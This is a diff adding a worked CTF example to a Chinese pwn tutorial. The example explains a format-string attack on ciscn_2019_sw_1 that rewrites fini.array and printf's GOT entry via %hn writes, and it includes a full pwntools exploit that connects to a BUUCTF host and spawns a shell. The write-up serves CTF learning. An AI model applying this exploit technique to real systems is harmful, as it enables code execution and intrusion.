@@ -53,8 +53,8 @@ ANSI_COLOR="1;31
 
 更新日志：
 
-* upd on 2026.3.11：初发布。
-
+* upd on 26.03.11：初发布。
+* upd on 26.03.18：增加了 fmt 例题 ciscn_2019_sw_1。
 
 ---
 
@@ -1014,6 +1014,60 @@ def main():
     # io.sendline(b";/bin/sh")
     # sleep(0.01)
     io.sendline(b"cat flag")
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 例题 4：ciscn_2019_sw_1
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_sw_1)
+
+※ hint：NO RELRO。
+
+这道题如果按照上一道的思路去做，还是很简单的发现 offset = 4，而且还有现成的 system 不需要 ret2libc，但是由于严格的输入长度 `scanf("%64s")` 使得我们无法通过栈溢出跳回 main 函数。
+
+所以要引入 `fini.array`：
+
+* 程序结束时，会依次调用 fini.array 中的每一个函数指针。
+* 当程序出现格式化字符串漏洞，但是需要写两次才能完成攻击，这个时候可以考虑改写 fini.array 中的函数指针为 main 函数地址，可以再执行一次 main 函数。
+
+容易在 IDA 里找到 fini.array 的地址是 0x804979C。
+
+因为输入限制等原因，本题不能用 fmtstr_payload（反正我挂了），所以要用 %hn 手搓。
+
+我们的目标是：
+
+* fini.array（0x804979c） → main（0x08048534），不用改低 16 位，只改高 16 位，0x8534 = 34100
+* printf_got → system（0x080483D0），低 16 位 0x0804 = 2052，高 16 位 0x83D0 = 33744.
+
+从低到高排序，所以是 `2052%c%<?>$hn` + `%31692%c%<?+1>$hn` + `%356%c%<?+2>$hn`.
+
+当 ？ 是两位数时，刚好 payload 长度为 36，36/4 = 9，所以 ？ = 4+9 = 13。
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+
+host = "node5.buuoj.cn"
+port = 26483
+io = remote(host,port)
+# io = process("./ciscn_2019_sw_1")
+elf = ELF("./ciscn_2019_sw_1")
+system_plt = elf.plt['system']
+printf_got = elf.got['printf']
+main_addr = elf.sym['main']
+fini_array = 0x804979c
+
+def main():
+    io.recvuntil(b"Welcome to my ctf! What's your name?")
+    print("\n[+] Leak printf GOT address :",hex(printf_got))    # offset = 4
+    payload_1 = b"%2052c%13$hn%31692c%14$hn%356c%15$hn" + p32(printf_got + 2) + p32(printf_got) + p32(fini_array)
+    io.sendline(payload_1)
+    # io.recvuntil(b"Welcome to my ctf! What's your name?")
+    io.sendline(b"/bin/sh")
     io.interactive()
 
 if __name__ == "__main__":
